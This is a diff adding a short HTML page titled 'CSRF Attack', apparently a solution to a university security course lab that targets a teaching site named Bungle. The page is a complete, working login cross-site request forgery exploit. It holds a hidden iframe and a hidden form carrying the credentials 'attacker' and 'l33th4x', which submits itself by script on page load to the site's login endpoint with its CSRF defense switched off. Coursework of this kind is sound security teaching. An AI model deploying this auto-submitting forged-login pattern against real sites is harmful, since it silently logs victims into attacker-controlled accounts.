@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack</title>
+</head>
+<body>
+
+  <!--Creating the Iframe-->
+<iframe id="csrfFrame" name="csrfFrame" style="display:none;"></iframe>
+
+<!-- Submits Login Credentials -->
+<form id="loginForm" method="POST" action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=0&xssdefense=5" target="csrfFrame">
+    <input type="hidden" name="username" value="attacker">
+    <input type="hidden" name="password" value="l33th4x">
+</form>
+
+<script>
+    document.getElementById("loginForm").submit();
+</script>
+
+</body>
+</html>
